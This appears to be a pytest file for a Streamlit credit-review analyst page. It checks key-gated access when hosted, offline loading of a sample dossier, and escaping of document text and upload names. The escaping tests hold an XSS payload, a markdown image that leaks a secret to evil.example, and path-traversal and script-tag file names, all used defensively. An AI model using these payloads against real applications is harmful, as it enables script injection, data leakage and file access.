"""The analyst page (app.py): closed without the key when hosted, document text shown as text, the sample loads."""

import pytest

from credit_review.display import esc, md, safe_name
from tests.conftest import ROOT

testing = pytest.importorskip("streamlit.testing.v1", reason="the analyst page needs the ui extra")
APP = str(ROOT / "app.py")


@pytest.fixture
def page(monkeypatch, tmp_path):
    monkeypatch.setenv("CREDIT_REVIEW_LLM_OFFLINE", "1")          # never a model call from a test
    monkeypatch.setenv("CREDIT_REVIEW_CACHE_DIR", str(tmp_path))
    for name in ("CREDIT_REVIEW_UI_HOSTED", "CREDIT_API_KEY", "CREDIT_REVIEW_STORAGE_URL"):
        monkeypatch.delenv(name, raising=False)

    def run(**env: str):
        for k, v in env.items():
            monkeypatch.setenv(k, v)
        return testing.AppTest.from_file(APP, default_timeout=120).run()
    return run


def test_hosted_without_a_configured_key_the_page_stays_closed(page):
    at = page(CREDIT_REVIEW_UI_HOSTED="1")
    assert "stays closed" in at.error[0].value and not at.sidebar.radio


def test_hosted_the_page_opens_only_with_the_key(page):
    at = page(CREDIT_REVIEW_UI_HOSTED="1", CREDIT_API_KEY="right")
    assert not at.sidebar.radio
    at.text_input[0].input("wrong").run()
    assert "not accepted" in at.error[0].value and not at.sidebar.radio
    at.text_input[0].input("right").run()
    assert at.sidebar.radio[0].options == ["Sample dossier", "Upload PDFs"]


def test_locally_the_sample_dossier_loads_without_a_model(page):
    at = page()
    assert not at.exception
    assert at.sidebar.radio[0].options == ["Sample dossier", "Upload PDFs"]     # never a typed server path
    assert any(h.value == "1. Documents" for h in at.header)


def test_document_text_cannot_become_markup_links_or_images():
    assert esc('<img src=x onerror="alert(1)">\n\nnext') == \
        "&lt;img src=x onerror=&quot;alert(1)&quot;&gt;<br><br>next"
    assert md("![x](https://evil.example/?q=secret) **b**") == \
        r"\!\[x\]\(https://evil.example/?q=secret\) \*\*b\*\*"


@pytest.mark.parametrize(("name", "safe"), [("payslip.pdf", "payslip.pdf"), ("../../etc/passwd", "passwd.pdf"),
                                            ("a<script>.PDF", "a_script_.PDF"), ("", "document.pdf")])
def test_uploaded_file_names_are_reduced_to_plain_names(name, safe):
    assert safe_name(name) == safe
